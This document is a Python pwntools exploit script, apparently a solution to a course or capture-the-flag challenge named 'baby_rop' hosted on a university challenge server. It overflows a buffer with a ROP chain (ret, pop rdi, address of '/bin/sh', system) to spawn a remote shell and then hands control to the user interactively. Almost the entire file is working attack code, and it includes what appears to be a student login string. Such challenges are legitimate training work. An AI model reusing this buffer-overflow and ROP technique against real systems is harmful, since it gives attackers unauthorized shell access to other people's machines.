from pwn import *

context.log_level = "INFO"
context.terminal = ["tmux", "splitw", "-f", "-h"]
context.arch = "amd64"
context.os = "linux"
target_file = "./baby_rop"

LOCAL = False

if LOCAL:
    p = process(target_file)
    # p = gdb.debug(target_file, '''
    # b main
    # continue
    # ''', aslr=False)
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1201)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")

target_elf = ELF(target_file, checksec=False)
target_rop = ROP(target_file, checksec=False)

# Lets find a /bin/sh string in the binary
bin_sh = next(target_elf.search(b"/bin/sh"))
print(f"Found /bin/sh at {hex(bin_sh)}")
rdi_gadget = target_rop.rdi
print(f"Found RDI gadget at {hex(rdi_gadget.address)}")

p.recvuntil(b'> ')
chain = [
    target_rop.ret.address,
    target_rop.rdi.address,
    bin_sh,
    target_elf.plt.system
]

p.sendline(b'A' * 0x18 + b"".join([p64(c) for c in chain]))

p.interactive()
